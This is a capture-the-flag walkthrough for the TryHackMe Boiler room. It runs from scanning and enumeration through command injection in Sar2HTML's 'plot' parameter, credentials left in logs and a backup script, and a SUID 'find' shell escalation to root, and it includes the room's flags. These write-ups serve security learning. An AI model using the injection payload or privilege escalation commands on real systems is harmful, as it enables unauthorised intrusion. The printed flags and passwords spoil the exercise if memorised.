# Walkthrough: TryHackMe - Boiler CTF
## Initial Reconnaissance & Enumeration

### 1. Network Scan (```Nmap```)
Run a full port scan with default scripts and version detection:

```bash 
  nmap -sC -sV -p- 10.49.160.244
```
Discovered Ports:
- 21/tcp: FTP (vsftpd 3.0.3 - Anonymous login allowed)
- 80/tcp: HTTP (Apache httpd 2.4.18)
- 10000/tcp: HTTP (MiniServ 1.930 / Webmin)
- 55007/tcp: SSH (OpenSSH 7.2p2 Ubuntu)

### 2. FTP Enumeration
Log into FTP using anonymous access to inspect downloadable files:

```bash
    ftp 10.49.160.244
# User: anonymous
# Password: <press enter>
ftp> get .info.txt
```
Decrypting .info.txt:

```bash
    Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```
Decoding via ROT13 yields:

    "Just wanted to see if you find it. Lol. Remember: Enumeration is the key!"

### 3. Web & Hidden Directory Discovery
Running directory enumeration on the Apache server reveals /```joomla```/ and /```robots.txt```.

- Converting the ASCII sequence found in ```robots.txt``` produces a Base64 string, which decodes to a fake MD5 hash (a rabbit hole).

---

## Vulnerability Exploitation via Sar2HTML
### 4. Deep Directory Enumeration on Joomla
Enumerate subdirectories under /```joomla```/:

```bash
    gobuster dir -u http://10.49.160.244/joomla/ -w /usr/share/wordlists/dirb/common.txt
```

Discovered Path:

- [http://10.49.160.244/joomla/_test/](http://10.49.160.244/joomla/_test/) (hosts Sar2HTML v3.2.1)

### 5. Remote Code Execution (RCE) on Sar2HTML
Sar2HTML v3.2.1 is vulnerable to Remote Code Execution via the ```plot``` URL parameter.

1. Test command execution directly in the browser:

```bash
      http://10.49.160.244/joomla/_test/index.php?plot=;cat log.txt
```
2. Inspect log files for sensitive credentials by viewing page source:

```bash
      Inspect log files for sensitive credentials by viewing page source:
```
Discovered Credentials in ```log.txt```:

-Username: ```basterd```
-Password: ```superduperp@ss```

---

## SSH Access & Lateral Movement
### 6. SSH Initial Access (```basterd```)
Connect via SSH using the non-standard port ```55007```:

```bash
      ssh basterd@10.49.160.244 -p 55007
```

### 7. Lateral Movement to stoner

1. Inspect files in basterd's home directory:

```bash
      ls -la
cat backup.sh
```
2. Inside ```backup.sh```, locate the commented-out password for user ```stoner```:

```bash
        USER=stoner
#superduperp@ssno1knows
```
3. Switch user to ```stoner```:

```bash
      su stoner
# Password: superduperp@ssno1knows
```
4. Navigate to stoner's home directory and read the user flag:

```bash
      cd /home/stoner
cat .secret
```
User Flag: ```You made it till here, well done.```

### 8. Enumeration with LinPEAS
Transfer and execute ```linpeas.sh``` or enumerate binaries manually. LinPEAS flags ```/usr/bin/find``` under Files with Interesting Permissions (SUID):

```bash
    find / -perm -u=s -type f 2>/dev/null
```
```bash
    -r-sr-xr-x 1 root root 227K Feb  8  2016 /usr/bin/find
```

### 9. GTFOBins SUID Exploitation
Since ```/usr/bin/find``` has the SUID bit set and is owned by ```root```, execute GTFOBins' ```find``` SUID payload to spawn a privileged shell without dropping effective privileges:

```bash
      /usr/bin/find . -exec /bin/sh -p \; -quit
```
### 10. Retrieving the Root Flag
Verify effective root privileges and read ```root.txt```:

```bash
      whoami
# Output: root

cd /root
cat root.txt
```

Root Flag: ```It wasn't that hard, was it?```
